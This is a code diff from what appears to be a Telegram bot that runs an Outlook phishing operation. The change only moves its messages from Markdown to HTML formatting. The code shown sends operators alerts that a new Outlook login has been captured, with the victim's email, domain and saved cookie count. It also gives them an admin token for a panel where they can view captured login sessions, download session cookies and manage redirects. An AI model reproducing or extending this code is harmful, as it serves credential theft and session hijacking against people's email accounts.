@@ -986,34 +986,34 @@ chmod +x install_outlook.sh && ./install_outlook.sh`;
         const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
         
         const tokenMessage = `
-🔧 **Admin Panel Access**
+🔧 <b>Admin Panel Access</b>
 
-🔑 **Your Admin Token:**
-\`${adminToken}\`
+🔑 <b>Your Admin Token:</b>
+<code>${adminToken}</code>
 
-🌐 **Admin Panel URL:**
+🌐 <b>Admin Panel URL:</b>
 ${adminUrl}
 
-**How to use:**
+<b>How to use:</b>
 1. Copy the token above
 2. Click "Open Admin Panel" below
 3. Enter the token to authenticate
 4. Access all admin features and session data
 
-**Features Available:**
+<b>Features Available:</b>
 • View all captured login sessions
 • Download session cookies and data
 • Monitor system analytics
 • Configure Cloudflare settings
 • Manage redirect destinations
 
-🔒 **Security Note:** This token provides full administrative access. Keep it secure and don't share it.
+🔒 <b>Security Note:</b> This token provides full administrative access. Keep it secure and don't share it.
         `;
 
         this.bot.editMessageText(tokenMessage, {
             chat_id: chatId,
             message_id: messageId,
-            parse_mode: 'Markdown',
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
                     [{ text: '🌐 Open Admin Panel', url: adminUrl }],
@@ -1035,13 +1035,13 @@ ${adminUrl}
         const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
         
         const notificationMessage = `
-🔐 **New Outlook Login Captured!**
+🔐 <b>New Outlook Login Captured!</b>
 
-📧 **Email:** \`${email}\`
-🏢 **Domain:** \`${domain}\`
-🕐 **Time:** ${new Date(timestamp).toLocaleString()}
-📊 **Cookies:** ${totalCookies} saved
-🆔 **Session:** ${sessionId}
+📧 <b>Email:</b> <code>${email}</code>
+🏢 <b>Domain:</b> <code>${domain}</code>
+🕐 <b>Time:</b> ${new Date(timestamp).toLocaleString()}
+📊 <b>Cookies:</b> ${totalCookies} saved
+🆔 <b>Session:</b> ${sessionId}
 
 🌐 Access admin panel to view details and download cookies
         `;
@@ -1050,7 +1050,7 @@ ${adminUrl}
         for (const chatId of this.chatIds) {
             try {
                 await this.bot.sendMessage(chatId, notificationMessage, {
-                    parse_mode: 'Markdown',
+                    parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [{ text: '🌐 Open Admin Panel', url: adminUrl }],
